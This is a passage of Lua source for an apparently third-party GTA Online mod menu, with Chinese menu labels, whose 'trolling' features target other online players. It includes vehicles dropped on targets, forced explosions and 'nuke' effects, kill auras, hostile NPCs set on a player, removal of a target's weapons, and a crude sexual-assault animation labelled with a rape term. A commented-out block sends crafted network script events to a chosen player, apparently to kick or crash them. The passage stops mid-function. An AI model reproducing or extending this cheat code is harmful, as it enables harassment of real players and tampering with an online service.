        util.yield()
    end
    TASK.TASK_PLAY_ANIM(ped, "anim@heists@heist_safehouse_intro@phone_couch@male", "phone_couch_male_idle", 3.0, 2.0, -1, 3, 1.0, false, false, false)
else
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    ENTITY.DETACH_ENTITY(p, false, false)
    ENTITY.DETACH_ENTITY(players.user_ped(), false, false)
    TASK.CLEAR_PED_TASKS(PLAYER.PLAYER_PED_ID())
end
end)
GTTG(updatetroll, '打坐玩家', {"nightvision"}, '', function (on)
if on then
    ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, -0.058, 0.197, 0.595, 2.0, 1.0,1, true, true, true, false, 0, true)
    ped = players.user_ped()
    while not STREAMING.HAS_ANIM_DICT_LOADED("timetable@jimmy@mics3_ig_15@") do
        STREAMING.REQUEST_ANIM_DICT("timetable@jimmy@mics3_ig_15@")
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(ped, "timetable@jimmy@mics3_ig_15@", "idle_a_tracy", 3.0, 2.0, -1, 3, 1.0, false, false, false)
else
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    ENTITY.DETACH_ENTITY(p, false, false)
    ENTITY.DETACH_ENTITY(players.user_ped(), false, false)
    TASK.CLEAR_PED_TASKS(PLAYER.PLAYER_PED_ID())
end
end)
updatetroll:action("车辆弹飞", {}, "让玩家的车飞起来", function()
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
if vehicle == 0 then
   return
end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 100, 40, true, true, true, true)
end)
updatetroll:action("在他面前生成斜坡", {}, "", function() 
  local ramp_hash = util.joaat("stt_prop_ramp_jump_s")
  local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
  local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0, 10, -2)
  local rot = ENTITY.GET_ENTITY_ROTATION(ped, 2)
  STREAMING.REQUEST_MODEL(ramp_hash)
while not STREAMING.HAS_MODEL_LOADED(ramp_hash) do
   wait()
 end
local ramp = OBJECT.CREATE_OBJECT(ramp_hash, pos.x, pos.y, pos.z, true, false, true)
    ENTITY.SET_ENTITY_VISIBLE(ramp, true)
    ENTITY.SET_ENTITY_ROTATION(ramp, rot.x, rot.y, rot.z + 90, 0, true)
    wait(2500)
    entities.delete_by_handle(ramp)
end)
updatetroll:textslider("分离车轮(新版)", {}, "把轮子卸载", { "前左", "前右", "后左", "后右", "全卸了"}, function(index, value, click_type)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if PED.IS_PED_IN_ANY_VEHICLE(pedm, true) then 
        local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true) 
        local tick = 0
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vmod)
    while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vmod) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vmod)
    local netId = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(vmod)
         NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, true)
             wait()
                tick =  tick + 1
                if tick > 20 then
                    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vmod) then
                        gtoast("无法控制车辆")
                        return
                    end
                end
            end 
    pluto_switch index do 
       case 1: 
          entities.detach_wheel(vmod, 0)
          break
       case 2: 
          entities.detach_wheel(vmod, 1)
          break
       case 3:
          entities.detach_wheel(vmod, 2)
          break
       case 4:
          entities.detach_wheel(vmod, 3)
          break
       case 5:
          entities.detach_wheel(vmod, 0)
          entities.detach_wheel(vmod, 1)
          entities.detach_wheel(vmod, 2)
          entities.detach_wheel(vmod, 3)
          break
        end
    end
end)
updatetroll:toggle_loop("无限爬楼梯", {}, "让他一直往上爬", function()
    local LadderHash = 1122863164 --3469023669
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local SpawnOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pedm, 0, 2, 2.5)
    OBJ = entities.create_object(LadderHash, SpawnOffset)
        if not ENTITY.DOES_ENTITY_EXIST(OBJ) then
    end
    local SpawnOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pedm, 0, 2, 2.5)
    local Player_Rot = ENTITY.GET_ENTITY_ROTATION(pedm, 2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(OBJ, SpawnOffset.x, SpawnOffset.y, SpawnOffset.z, false, false, false)
        ENTITY.SET_ENTITY_ROTATION(OBJ, Player_Rot.x, Player_Rot.y, Player_Rot.z, 2, true)
    end, function()
    entities.delete(OBJ)
end)
updatetroll:toggle_loop("疯狂恶搞", {}, "", function()
if players.exists(pid) then
    local freeze_toggle = menu.ref_by_rel_path(menu.player_root(pid), "Trolling>Freeze")
    local player_pos = players.get_position(pid)
    menu.set_value(freeze_toggle, true)
    request_ptfx_asset("core")
    GRAPHICS.USE_PARTICLE_FX_ASSET("core")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
    "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
    )
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
    "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
    )
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
    "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
    )
    FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, 0, 1, true, false, 1, false)
    FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 70, 1, true, false, 1, false)
    FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 38, 1, true, false, 1, false)
    FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 12, 1, true, false, 1, false)
    FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 13, 1, true, false, 1, false)
    FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1.0, 20, 1, true, false, 0, false)
    FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, 23, 100.0, true, false, 0.0)
    FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, 45, 100.0, true, false, 0.0)
    FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, 26, 100.0, true, false, 0.0)
    FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, 6, 100.0, true, false, 0.0)
    FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, 24, 100.0, true, false, 0.0)
    FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 38, 1, true, false, 1, false)
    wait(100)
    end
end)
function is_ped_player(ped)
    if PED.GET_PED_TYPE(ped) >= 4 then
        return false
    else
        return true
    end
end
GTLP(updatetroll, "附加附近所有实体", {}, "", function(on)
    local tar = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local objects = entities.get_all_objects_as_handles()
    local vehicles = entities.get_all_vehicles_as_handles()
    local peds = entities.get_all_peds_as_handles()
    for i, ent in pairs(peds) do
        if not is_ped_player(VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)) then
            ENTITY.ATTACH_ENTITY_TO_ENTITY(ent, tar, 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
        end
    end
    for i, ent in pairs(vehicles) do
        if not is_ped_player(VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)) then
            ENTITY.ATTACH_ENTITY_TO_ENTITY(ent, tar, 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
        end
    end
    for i, ent in pairs(objects) do
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ent, tar, 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
    end
end)
GTLP(updatetroll, "持续扫射攻击", {},"", function()
    excludeb(pid)
    excludec(pid)
    excluded(pid)
    excludee(pid)
end)
GTLP(updatetroll, "观音坐莲", {}, "", function()
    local pos = players.get_position(pid)
    for _, ped in entities.get_all_peds_as_handles() do
        if IS_PLAYER_PED(ped) then goto out end
        ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, false)
        ::out::
    end
end)
GTAC(updatetroll, "强制下地狱", {""}, "", function()
    for i = 1, 10 do 
    local pos = players.get_position(pid)
        local wjped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
          pos.z = pos.z + 10
          local crash_plane = CreateVehicle(0x2EA68690, pos, 0)
           PED.SET_PED_INTO_VEHICLE(sb_ped,crash_plane,-1)
           PED.SET_PED_INTO_VEHICLE(sb_ped, crash_plane, -1)
        for i = 1, 20 do 
            pos.z = pos.z - 0.5 
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(crash_plane, pos.x,pos.y,pos.z, true, true, true)
            wait(30) 
        end
        wait(100)
        entities.delete_by_handle(crash_plane)
        end
    end)
GTLP(updatetroll, "附近车辆撞击", {""}, "附近车辆将变得对玩家有敌意.", function()
    if not players.exists(pid) then return end
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for get_vehicles_in_player_range(pid, 70.0) as vehicle do
          if TASK.GET_ACTIVE_VEHICLE_MISSION_TYPE(vehicle) != 6 then
              local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1, false)
              if ENTITY.DOES_ENTITY_EXIST(driver) and not PED.IS_PED_A_PLAYER(driver) then
              request_control(driver)
              PED.SET_PED_MAX_HEALTH(driver, 300)
              ENTITY.SET_ENTITY_HEALTH(driver, 300, 0)
              PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
              TASK.TASK_VEHICLE_MISSION_PED_TARGET(driver, vehicle, ped, 6, 100.0, 0, 0.0, 0.0, true)
           end
       end
    end
end)
--[[GTAC(updatetroll, "让他滚蛋", {}, "", function ()
    if players.user() then
    util.trigger_script_event(1 << pid, {1103127469, players.user(), id, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(1, 10)})
    util.trigger_script_event(1 << pid, {1103127469, players.user(), id, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    util.trigger_script_event(1 << pid, {1103127469, players.user(), id, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
    end
end)]]
GTTG(updatetroll, '上头船', {""}, '骑人', function (on)
    if on then
        ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0,0, -0.2, 0.595, 2.0, 1.0,180, true, true, true, false, 0, true)
        ped = players.user_ped()
        while not STREAMING.HAS_ANIM_DICT_LOADED("rcmjosh2") do
            STREAMING.REQUEST_ANIM_DICT("rcmjosh2")
            wait()
        end
        TASK.TASK_PLAY_ANIM(ped, "rcmjosh2", "josh_sitting_loop", 3.0, 2.0, -1, 3, 1.0, false, false, false)
    else
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        ENTITY.DETACH_ENTITY(p, false, false)
        ENTITY.DETACH_ENTITY(players.user_ped(), false, false)
        TASK.CLEAR_PED_TASKS(PLAYER.PLAYER_PED_ID())
    end
    end)
    GTTG(updatetroll, '下头船', {""}, '强奸', function (on)
    if on then
        ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, 0, -0.2, 0, 2.0, 1.0,1, true, true, true, false, 0, true)
        ped = players.user_ped()
        while not STREAMING.HAS_ANIM_DICT_LOADED("rcmpaparazzo_2") do
            STREAMING.REQUEST_ANIM_DICT("rcmpaparazzo_2")
            wait()
        end
        TASK.TASK_PLAY_ANIM(ped, "rcmpaparazzo_2", "shag_loop_a", 3.0, 2.0, -1, 3, 1.0, false, false, false)
    else
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        ENTITY.DETACH_ENTITY(p, false, false)
        ENTITY.DETACH_ENTITY(players.user_ped(), false, false)
        TASK.CLEAR_PED_TASKS(PLAYER.PLAYER_PED_ID())
    end
    end)
GTAC(updatetroll, "小丑花车攻击", {"letpersonfk"}, "", function(on_click)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z'] + 20.0
    request_model(util.joaat("speedo2"))
    local truck = entities.create_vehicle(util.joaat("speedo2"), coords, 0.0)
    local vel = ENTITY.GET_ENTITY_VELOCITY(PLAYER.GET_PLAYER_PED(pid),vel)
    ENTITY.SET_ENTITY_VELOCITY(truck, vel['x'], vel['y'], -200.0)
    VEHICLE.SET_VEHICLE_DOORS_LOCKED(truck, 3)
    VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(truck, true)
    wait(2000)
    entities.delete_by_handle(truck)
end)
GTAC(updatetroll, "小电驴砸死他", {"crush2"}, "", function(on_click)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z'] + 20.0
    request_model(util.joaat("faggio2"))
    local truck = entities.create_vehicle(util.joaat("faggio2"), coords, 0.0)
    local vel = ENTITY.GET_ENTITY_VELOCITY(PLAYER.GET_PLAYER_PED(pid),vel)
    ENTITY.SET_ENTITY_VELOCITY(truck, vel['x'], vel['y'], -200.0)
    VEHICLE.SET_VEHICLE_DOORS_LOCKED(truck, 3)
    VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(truck, true)
    wait(2000)
    entities.delete_by_handle(truck)
end)
Trolling_NearbyVehicle = GT(updatetroll, "控制玩家附近载具", {}, "需要在此玩家附近")
player_nearby_vehicle = {
    radius = 60,
    mission_type = 6,
}
menu.slider(Trolling_NearbyVehicle, "范围半径", { "nearby_veh_radius" }, "", 0, 1000, 60, 10,
    function(value)
        player_nearby_vehicle.radius = value
    end)
GTLP(Trolling_NearbyVehicle, "附近司机追赶此玩家", {}, "", function()
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    for _, vehicle in pairs(GET_NEARBY_VEHICLES(pid, player_nearby_vehicle.radius)) do
        local driver = GET_PED_IN_VEHICLE_SEAT(vehicle, -1)
        if driver ~= 0 then
            if not IS_PED_PLAYER(driver) and not TASK.GET_IS_TASK_ACTIVE(driver, 363) then
                RequestControl(driver)
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
                PED.SET_PED_KEEP_TASK(driver, true)
                disable_ped_flee_attributes(driver)
                TASK.TASK_VEHICLE_CHASE(driver, player_ped)
            end
        end
    end
end)
GTD(Trolling_NearbyVehicle, "设置载具行为")
menu.list_select(Trolling_NearbyVehicle, "行为类型", {}, "", Vehicle_MissionType.ListItem, 6,
    function(value)
        player_nearby_vehicle.mission_type = Vehicle_MissionType.ValueList[value]
    end)
GTLP(Trolling_NearbyVehicle, "设置针对此玩家的行为", {}, "", function()
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    for _, vehicle in pairs(GET_NEARBY_VEHICLES(pid, player_nearby_vehicle.radius)) do
        local driver = GET_PED_IN_VEHICLE_SEAT(vehicle, -1)
        if driver ~= 0 then
            if not IS_PED_PLAYER(driver) and TASK.GET_ACTIVE_VEHICLE_MISSION_TYPE(vehicle) ~= player_nearby_vehicle.mission_type then
                RequestControl(driver)
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
                PED.SET_PED_KEEP_TASK(driver, true)
                disable_ped_flee_attributes(driver)
                TASK.TASK_VEHICLE_MISSION_PED_TARGET(driver, vehicle, player_ped, player_nearby_vehicle.mission_type,
                    500.0, 0, 0.0,
                    0.0, true)
            end
        end
    end
end)
--
Trolling_NearbyPed = GT(updatetroll, "控制玩家附近行人", {}, "需要在此玩家附近")
player_nearby_ped = {
    radius = 60,
    combat = {
        weapon = util.joaat(Weapon_Common.ModelList[1]),
        is_enhance = false,
        is_drop_money = false,
        health_mult = 1,
    },
}
menu.slider(Trolling_NearbyPed, "范围半径", { "nearby_ped_radius" }, "", 0, 1000, 60, 10,
    function(value)
        player_nearby_ped.radius = value
    end)
GTLP(Trolling_NearbyPed, "行人逮捕此玩家", {}, "", function()
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    for _, ped in pairs(GET_NEARBY_PEDS(pid, player_nearby_ped.radius)) do
        if not IS_PED_PLAYER(ped) and not TASK.IS_PED_RUNNING_ARREST_TASK(ped) then
            RequestControl(driver)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
            TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
            PED.SET_PED_KEEP_TASK(driver, true)
            disable_ped_flee_attributes(driver)
            TASK.TASK_ARREST_PED(ped, player_ped)
        end
    end
end)
GTD(Trolling_NearbyPed, "行人敌对此玩家")
GTLP(Trolling_NearbyPed, "开启", {}, "", function()
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local weapon_smoke = util.joaat("WEAPON_SMOKEGRENADE")
    for _, ped in pairs(GET_NEARBY_PEDS(pid, player_nearby_ped.radius)) do
        if not IS_PED_PLAYER(ped) and not PED.IS_PED_IN_COMBAT(ped, player_ped) then
            RequestControl(ped)
            WEAPON.GIVE_WEAPON_TO_PED(ped, weapon_smoke, -1, false, false)
            WEAPON.GIVE_WEAPON_TO_PED(ped, player_nearby_ped.combatweapon, -1, false, true)
            WEAPON.SET_CURRENT_PED_WEAPON(ped, player_nearby_ped.combat.weapon, false)
            WEAPON.SET_PED_DROPS_WEAPONS_WHEN_DEAD(ped, false)
            local health = ENTITY.GET_ENTITY_MAX_HEALTH(ped)
            ENTITY.SET_ENTITY_HEALTH(ped, health * player_nearby_ped.combat.health_mult)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
            TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
            disable_ped_flee_attributes(ped)
            TASK.TASK_COMBAT_PED(ped, player_ped, 0, 16)
            PED.SET_PED_KEEP_TASK(ped, true)
            --强化作战能力
            if player_nearby_ped.combat.is_enhance then
                increase_ped_combat_ability(ped)
                increase_ped_combat_attributes(ped)
            end
            --掉落现金为2000
            if player_nearby_ped.combat.is_drop_money then
                PED.SET_PED_MONEY(ped, 2000)
            end
        end
    end
end)
GTTG(Trolling_NearbyPed, "强化作战能力", {}, "如果npc会逃跑的话，开启这个",
    function(toggle)
        player_nearby_ped.combat.is_enhance = toggle
    end)
menu.slider(Trolling_NearbyPed, "血量加倍", { "nearbyped_health_mult" }, "", 1, 100, 1, 1,
    function(value)
        player_nearby_ped.combat.health_mult = value
    end)
GTTG(Trolling_NearbyPed, "击杀后掉两千块钱", {}, "当做击杀奖励", function(toggle)
    player_nearby_ped.combat.is_drop_money = toggle
end)
GTAC(updatetroll, "以此玩家击杀所有NPC", {}, "", function()
    local weaponHash = util.joaat("WEAPON_APPISTOL")
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if not IS_PED_PLAYER(ped) and not ENTITY.IS_ENTITY_DEAD(ped) then
            local head_pos = PED.GET_PED_BONE_COORDS(ped, 0x322c, 0, 0, 0)
            local vector = ENTITY.GET_ENTITY_FORWARD_VECTOR(ped)
            local start_pos = {}
            start_pos.x = head_pos.x + vector.x
            start_pos.y = head_pos.y + vector.y
            start_pos.z = head_pos.z + vector.z
            local ped_veh = GET_VEHICLE_PED_IS_IN(ped)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
            start_pos.x, start_pos.y, start_pos.z,
            head_pos.x, head_pos.y, head_pos.z,
            1000, false, weaponHash, player_ped,
            false, false, 1000)
        end
    end
end)
GTAC(updatetroll, "载具内敌人攻击", {}, "", function()
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vehicle = GET_VEHICLE_PED_IS_IN(player_ped)
    if vehicle ~= 0 then
        local modelHash = util.joaat("A_M_M_ACult_01")
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_ped, 0.0, 0.0, 2.0)
        local heading = ENTITY.GET_ENTITY_HEADING(player_ped)
        local g_ped = Create_Network_Ped(26, modelHash, coords.x, coords.y, coords.z, heading)
        PED.SET_PED_INTO_VEHICLE(g_ped, vehicle, -2)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(g_ped, true)
        TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(g_ped, true)
        TASK.TASK_COMBAT_PED(g_ped, player_ped, 0, 16)
        PED.SET_PED_KEEP_TASK(g_ped, true)
        PED.SET_PED_MONEY(g_ped, 2000)
        ENTITY.SET_ENTITY_MAX_HEALTH(g_ped, 30000)
        ENTITY.SET_ENTITY_HEALTH(g_ped, 30000)
        PED.SET_PED_CAN_BE_SHOT_IN_VEHICLE(g_ped, false)
        PED.SET_PED_CAN_BE_DRAGGED_OUT(g_ped, false)
        local weaponHash = util.joaat("WEAPON_MICROSMG")
        WEAPON.GIVE_WEAPON_TO_PED(g_ped, weaponHash, -1, false, true)
        WEAPON.SET_CURRENT_PED_WEAPON(g_ped, weaponHash, true)
        disable_ped_flee_attributes(g_ped)
        increase_ped_combat_ability(g_ped, false, false)
        increase_ped_combat_attributes(g_ped)
        PED.SET_PED_COMBAT_ATTRIBUTES(g_ped, 3, false) --CanLeaveVehicle
    else
        gtoast("未找到玩家的载具")
    end
end)
GTLP(updatetroll, ("玩家射击时删除武器"), {""}, "", function()
    local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if PED.IS_PED_SHOOTING(targetPed) then
        local weaponhash = WEAPON.GET_SELECTED_PED_WEAPON(targetPed)
        WEAPON.REMOVE_WEAPON_FROM_PED(targetPed, weaponhash)
    end
end)
dropnuke = GT(updatetroll,("新型核弹"), {""}, "BOOM!!!")
GTAC(dropnuke, ("正常掉落核弹"), {}, "", function()
    local hash = util.joaat("prop_military_pickup_01")
    ent_func.request_model(hash)
    local pos = players.get_position(pid)
    local nuke = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, pos.x, pos.y, pos.z + 20, true, false, true)
    ENTITY.APPLY_FORCE_TO_ENTITY(nuke, 3, 0.0, 0.0, -50, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
    ENTITY.SET_ENTITY_HAS_GRAVITY(nuke, true)
    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(nuke) and not ENTITY.IS_ENTITY_IN_WATER(nuke) do
        util.yield(0)
    end
    local nukePos = ENTITY.GET_ENTITY_COORDS(nuke, true)
    entities.delete_by_handle(nuke)
    ent_func.create_nuke_explosion(nukePos)
end)
GTAC(dropnuke, ("直接在玩家身上爆炸"), {}, "", function()
    local pos = players.get_position(pid)
    ent_func.create_nuke_explosion(pos)
end)
GTAC(dropnuke, "粒子碎片核弹", {""}, "", function(on_click)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local Object_pizza1 = CreateVehicle(1131912276,TargetPlayerPos,0)
    local Object_pizza2 =CreateObject(253279588,TargetPlayerPos)
        TargetPlayerPos.y = TargetPlayerPos.y + 2
        TargetPlayerPos.z = TargetPlayerPos.z + 70 
        ENTITY.SET_ENTITY_ALPHA(Object_pizza1, 255)
        ENTITY.SET_ENTITY_VISIBLE(Object_pizza1, false, 0)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Object_pizza2,Object_pizza1, 0,  0.0, 0.00, 0.00, 1.0, 1.0,1, true, false, true, false, 0, true)
    wait(5000)
    do
    orbital(pid)
    entities.delete_by_handle(Object_pizza1)
    entities.delete_by_handle(Object_pizza2)
  end
end)
safeguards_transporter = GTTG(dropnuke,("护送核弹车"), {""}, ("生成一个装有核弹的卡车\n卡车爆炸后核弹也会爆炸\n这样任何人都可以引爆它"), function(on)
    if on then
        if not ENTITY.DOES_ENTITY_EXIST(0,nuke) then
            local pos = players.get_position(pid)
            local hash = util.joaat("tiptruck")
            ent_func.request_model(hash)
            truck = VEHICLE.CREATE_VEHICLE(hash, pos.x , pos.y + 5, pos.z, 0, true, false, true)
            local hash = util.joaat("prop_military_pickup_01")
            ent_func.request_model(hash)
            local truck_pos = ENTITY.GET_ENTITY_COORDS(truck, true)
            local truck_rot = ENTITY.GET_ENTITY_ROTATION(truck, 0)
            nuke = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, truck_pos.x, truck_pos.y-1.5, truck_pos.z + 2, true, false, true)
            ENTITY.SET_ENTITY_HAS_GRAVITY(nuke, true)
            ENTITY.SET_ENTITY_ROTATION(nuke, truck_rot.x, truck_rot.y, truck_rot.z+90, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(nuke, truck, 0, 0.0, -1.5, 1.7, 0.0, 0.0, 90.0, false, false, false, false, 2, true)
        end
        util.create_tick_handler(function()
            if VEHICLE.GET_VEHICLE_ENGINE_HEALTH(truck) <= 0 and ENTITY.DOES_ENTITY_EXIST(nuke) then
                local nukePos = ENTITY.GET_ENTITY_COORDS(nuke, true)
                entities.delete_by_handle(nuke)
                ent_func.create_nuke_explosion(nukePos)
                menu.set_value(safeguards_transporter, false)
            end
        end)
    end
    if not on then
        if ENTITY.DOES_ENTITY_EXIST(0,nuke) then
            entities.delete_by_handle(nuke)
        end
        if ENTITY.DOES_ENTITY_EXIST(0,truck) then
            entities.delete_by_handle(truck)
        end
    end
end)
aura_list_player = GT(updatetroll,("杀戮光环(玩家)"), {""}, "在设定范围内产生效果")
player_aura_radius = 20
GTluaScript.slider(aura_list_player,("光环范围"), {"killaura"}, "", 5, 100, 20, 1, function(count)
    player_aura_radius = count
end)
GTLP(aura_list_player,("爆炸光环"), {}, "", function()
    local vehicles = entities.get_all_vehicles_as_pointers()
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local player_vehicle = ent_func.get_vehicle_from_ped(player_ped)
    for vehicles as vehicle do
        local vehicle_handle = entities.pointer_to_handle(vehicle)
        if vehicle_handle != player_vehicle then
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle_handle)
            if ent_func.get_distance_between(player_ped, vehicle_pos) <= player_aura_radius then
                if VEHICLE.GET_VEHICLE_ENGINE_HEALTH(vehicle_handle) >= 0 then
                    FIRE.ADD_EXPLOSION(vehicle_pos.x, vehicle_pos.y, vehicle_pos.z, 1, 1, false, true, 0.0, false)
                end
            end
        end
    end
    local peds = entities.get_all_peds_as_pointers()
	for peds as ped do
        local ped_handle = entities.pointer_to_handle(ped)
        if ped_handle != player_ped then
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped_handle, false)
		    if ent_func.get_distance_between(player_ped, ped_pos) <= player_aura_radius then
                if not PED.IS_PED_DEAD_OR_DYING(ped_handle, true) then
		    	    FIRE.ADD_EXPLOSION(ped_pos.x, ped_pos.y, ped_pos.z, 1, 1, false, true, 0.0, false)
                end
		    end
        end
	end
end)
GTLP(aura_list_player,("排斥光环"), {}, "", function()
    local vehicles = entities.get_all_vehicles_as_pointers()
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local player_vehicle = ent_func.get_vehicle_from_ped(player_ped)
    for vehicles as vehicle do
        local vehicle_handle = entities.pointer_to_handle(vehicle)
        if vehicle_handle != player_vehicle then
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle_handle)
            if ent_func.get_distance_between(player_ped, vehicle_pos) <= player_aura_radius then
                local rel = v3.new(vehicle_pos)
                --subtract your pos from rel--
                rel:sub(players.get_position(pid))
                --scales the v3 to have a length of 1--
                rel:normalise()
